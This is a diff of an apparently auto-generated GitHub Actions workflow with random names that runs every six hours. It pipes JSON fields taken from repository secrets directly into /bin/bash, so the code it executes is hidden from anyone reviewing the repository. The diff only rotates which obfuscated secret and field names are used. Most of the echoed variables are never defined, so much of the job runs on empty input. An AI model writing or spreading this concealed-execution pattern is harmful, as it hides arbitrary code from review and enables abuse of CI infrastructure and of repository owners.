@@ -1,9 +1,10 @@
 name: maiyuyjg
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 1/6 * * *'
-jobs:  # 28486
+    - cron: '22 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,13 +12,12 @@ jobs:  # 28486
       - uses: actions/checkout@v4
       - name: maiyuyjg
         env:
-          i5614: ${{ secrets.i5614 }}
+          c90: ${{ secrets.c90 }}
         run: |
-          echo $i5614 | jq -r .ypnsw87 | /bin/bash
-          echo $vg50067 | jq -r .tn47 | /bin/bash
-          echo $ccnzm7186 | jq -r .bylo6347 | /bin/bash
-          echo $m73 | jq -r .stgms5197 | /bin/bash
-          echo $a1 | jq -r .su5 | /bin/bash
-          echo $yyt5 | jq -r .oa3 | /bin/bash
-          echo $iqweo2066 | jq -r .asxlr2 | /bin/bash
+          echo $c90 | jq -r .gsxxf90180 | /bin/bash
+          echo $dxr296 | jq -r .lrai1339 | /bin/bash
+          echo $cjux09177 | jq -r .cscx0996 | /bin/bash
+          echo $qcda28429 | jq -r .ew71 | /bin/bash
+          echo $o65 | jq -r .spufh076 | /bin/bash
+          echo $zujoy69096 | jq -r .dt65 | /bin/bash
 
